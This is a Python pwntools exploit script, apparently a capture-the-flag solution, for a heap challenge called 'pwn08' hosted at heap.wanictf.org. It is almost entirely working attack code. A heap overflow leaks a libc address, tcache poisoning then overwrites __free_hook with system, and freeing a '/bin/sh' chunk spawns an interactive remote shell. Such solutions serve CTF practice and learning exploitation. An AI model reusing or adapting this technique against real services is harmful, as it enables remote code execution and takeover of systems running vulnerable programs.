#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./pwn08"
LIBCNAME = "./libc-2.27.so"

hosts = ("heap.wanictf.org","localhost","localhost")
ports = (9008,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge(ix):
  global c
  c.recvuntil("command?: ")
  c.sendline(str(ix))

def _add(ix, size):
  global c
  hoge(1)
  c.recvuntil(": ")
  c.sendline(str(ix))
  c.recvuntil("?: ")
  c.sendline(str(size))

def _edit(ix, data):
  global c
  hoge(2)
  c.recvuntil(": ")
  c.sendline(str(ix))
  c.recvuntil("?: ")
  c.send(data)

def _view(ix):
  global c
  hoge(3)
  c.recvuntil(": ")
  c.sendline(str(ix))

def _del(ix):
  global c
  hoge(9)
  c.recvuntil(": ")
  c.sendline(str(ix))

## exploit ###########################################

def exploit():
  global c

  _add(2, 0x10)
  _add(0, 0x500)
  _add(1, 0x10)
  _del(0)
  _edit(2, "A"*0x20)
  _view(2)
  c.recvuntil("A"*0x20)
  leak = unpack(c.recvline().rstrip().ljust(8,'\x00'))
  libcbase = leak-0x3ebca0
  print("[+] leak: "+hex(leak))
  print("[+] libcbase: "+hex(libcbase))
  _edit(2, "A"*0x10 + p64(0) + p64(0x511) + p64(leak) + p64(leak))

  _add(3, 0x10)
  _add(4, 0x10)
  _add(5, 0x10)
  _del(5)
  _del(4)
  _edit(3, "A"*0x10 + p64(0) + p64(0x21) + p64(libcbase + libc.symbols["__free_hook"]))

  _add(6, 0x10)
  _edit(6,  "/bin/sh\x00")
  _add(7, 0x10)
  _edit(7, p64(libcbase + libc.symbols["system"]))

  _del(6)

## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
